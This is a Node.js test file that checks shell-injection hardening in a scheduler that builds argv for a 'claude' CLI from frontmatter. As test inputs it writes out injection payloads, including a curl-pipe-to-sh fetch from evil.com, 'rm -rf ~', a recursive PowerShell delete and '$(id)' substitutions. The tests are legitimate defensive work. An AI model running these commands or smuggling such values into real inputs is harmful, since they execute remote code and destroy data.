// test/schedule-injection.test.js — shell-injection hardening tests
//
// Verifies that buildScheduleCommand returns a safe argv array and that
// quoteArgvForShell produces a shell string where malicious frontmatter
// values cannot execute as shell code.
//
// Ported from doctly/switchboard#32 (author: @joeytwiddle). Adapted for the
// fork's test style (node:test + assert/strict, no external test runner).
'use strict';

const test   = require('node:test');
const assert = require('node:assert/strict');

const { buildScheduleCommand } = require('../schedule-runner');
const { quoteArgForShell, quoteArgvForShell } = require('../shell-profiles');

// ── buildScheduleCommand ─────────────────────────────────────────────────────

test('buildScheduleCommand returns an argv array, not a shell string', () => {
  const { claudeArgs } = buildScheduleCommand('session-123', {
    cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' },
    prompt: 'do a thing',
  });
  assert.ok(Array.isArray(claudeArgs), 'claudeArgs must be an array');
  assert.ok(claudeArgs.includes('--resume'));
  assert.ok(claudeArgs.includes('session-123'));
  assert.ok(claudeArgs.includes('--model'));
  assert.ok(claudeArgs.includes('sonnet-4-6'));
  assert.ok(claudeArgs.includes('--allowedTools'));
  assert.ok(claudeArgs.includes('Read,Bash'));
});

test('buildScheduleCommand preserves injection payload as a literal argv token', () => {
  // The hostile value must survive as a single element — no shell sees it.
  const evil = 'x"; curl evil.com/sh | sh; echo "';
  const { claudeArgs } = buildScheduleCommand('sess', { cli: { model: evil } });
  const idx = claudeArgs.indexOf('--model');
  assert.ok(idx >= 0, '--model flag must be present');
  assert.equal(claudeArgs[idx + 1], evil, 'evil string must survive verbatim as one argv token');
});

test('buildScheduleCommand: backtick/dollar payloads survive as literal tokens', () => {
  const { claudeArgs: args1 } = buildScheduleCommand('sess', { cli: { model: '`whoami`' } });
  assert.equal(args1[args1.indexOf('--model') + 1], '`whoami`');

  const { claudeArgs: args2 } = buildScheduleCommand('sess', { cli: { model: '$(id)' } });
  assert.equal(args2[args2.indexOf('--model') + 1], '$(id)');
});

test('buildScheduleCommand rejects max-budget-usd that is not numeric', () => {
  assert.throws(
    () => buildScheduleCommand('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } }),
    /max-budget-usd/,
  );
  assert.throws(
    () => buildScheduleCommand('sess', { cli: { 'max-budget-usd': '$(evil)' } }),
    /max-budget-usd/,
  );
});

test('buildScheduleCommand accepts valid numeric max-budget-usd', () => {
  const { claudeArgs } = buildScheduleCommand('sess', { cli: { 'max-budget-usd': '2.5' } });
  assert.ok(claudeArgs.includes('--max-budget-usd'));
  assert.ok(claudeArgs.includes('2.5'));
});

test('buildScheduleCommand rejects control characters in scalar fields', () => {
  assert.throws(
    () => buildScheduleCommand('sess', { cli: { model: 'foo\x00bar' } }),
    /unsafe characters/,
  );
  assert.throws(
    () => buildScheduleCommand('sess', { cli: { 'permission-mode': 'ok\x01bad' } }),
    /unsafe characters/,
  );
});

test('buildScheduleCommand allows newlines in append-system-prompt', () => {
  const multiline = 'line 1\nline 2\nline 3';
  const { claudeArgs } = buildScheduleCommand('sess', {
    cli: { 'append-system-prompt': multiline },
  });
  const idx = claudeArgs.indexOf('--append-system-prompt');
  assert.ok(idx >= 0, '--append-system-prompt flag must be present');
  assert.equal(claudeArgs[idx + 1], multiline);
});

test('buildScheduleCommand rejects control chars in append-system-prompt', () => {
  assert.throws(
    () => buildScheduleCommand('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } }),
    /unsafe characters/,
  );
});

test('buildScheduleCommand handles add-dirs safely', () => {
  const { claudeArgs } = buildScheduleCommand('sess', {
    cli: { 'add-dirs': '/tmp, /home/user' },
  });
  const dirArgs = [];
  for (let i = 0; i < claudeArgs.length - 1; i++) {
    if (claudeArgs[i] === '--add-dir') dirArgs.push(claudeArgs[i + 1]);
  }
  assert.deepEqual(dirArgs, ['/tmp', '/home/user']);
});

// ── quoteArgForShell / quoteArgvForShell ─────────────────────────────────────

test('quoteArgForShell: bash — wraps in single quotes, neutralises injection', () => {
  const evil = 'x"; curl evil.com | sh; echo "';
  const quoted = quoteArgForShell('/bin/bash', evil);
  assert.ok(quoted.startsWith("'"), 'must start with single quote');
  assert.ok(quoted.endsWith("'"), 'must end with single quote');
  // The shell sees a single token; metachars inside single-quotes are inert.
  assert.equal(quoted, `'${evil}'`);
});

test('quoteArgForShell: bash — escapes embedded single quotes as \'\\\'\'', () => {
  assert.equal(quoteArgForShell('/bin/bash', "it's a test"), "'it'\\''s a test'");
});

test('quoteArgForShell: bash — backticks and $() are inert inside single quotes', () => {
  assert.equal(quoteArgForShell('/bin/bash', '`whoami`'), "'`whoami`'");
  assert.equal(quoteArgForShell('/bin/bash', '$(id)'), "'$(id)'");
});

test('quoteArgForShell: zsh behaves like bash (POSIX single-quote)', () => {
  assert.equal(quoteArgForShell('/bin/zsh', 'foo;bar'), "'foo;bar'");
});

test('quoteArgForShell: PowerShell — escapes internal single quotes as \'\'', () => {
  const evil = "'; Remove-Item -Recurse /";
  const quoted = quoteArgForShell('/usr/bin/pwsh', evil);
  // ' → '' inside single-quoted PS string
  assert.equal(quoted, "'''; Remove-Item -Recurse /'");
});

test('quoteArgvForShell: joins tokens with spaces, each safely quoted', () => {
  const joined = quoteArgvForShell('/bin/bash', ['--model', 'x"; evil', '--flag']);
  assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
});

// ── Integration: full malicious schedule ────────────────────────────────────

test('full simulated schedule: malicious frontmatter cannot escape shell quoting', () => {
  const evilSchedule = {
    cli: {
      'permission-mode': 'acceptEdits',
      model: 'x"; curl evil.com | sh; echo "',
      'allowed-tools': 'Bash,Read',
      'append-system-prompt': '$(whoami)',
      'add-dirs': '/tmp,/etc; touch /tmp/pwned',
    },
    prompt: 'scheduled task',
  };

  const { claudeArgs } = buildScheduleCommand('sess-id', evilSchedule);
  const cmd = 'claude ' + quoteArgvForShell('/bin/bash', claudeArgs);

  // Walk the command and extract text that is NOT inside single-quoted tokens.
  // If any shell metacharacter appears in that "outside" region, an injection leaked.
  let outside = '';
  let inQuote = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (c === "'") { inQuote = !inQuote; continue; }
    if (!inQuote) outside += c;
  }

  // Outside single-quoted tokens we expect only: the word "claude", spaces, and
  // the backslash from POSIX '\'' escapes (which re-enter a quote immediately).
  assert.ok(!/curl/.test(outside),    `"curl" leaked outside quotes: ${outside}`);
  assert.ok(!/whoami/.test(outside),  `"whoami" leaked outside quotes: ${outside}`);
  assert.ok(!/touch/.test(outside),   `"touch" leaked outside quotes: ${outside}`);
  assert.ok(!/[;|&`$]/.test(outside), `shell metachar leaked outside quotes: ${outside}`);

  // The evil model arg is preserved verbatim as a single-quoted token inside the command.
  assert.ok(
    cmd.includes(`'x"; curl evil.com | sh; echo "'`),
    `expected quoted model arg in: ${cmd}`,
  );
});
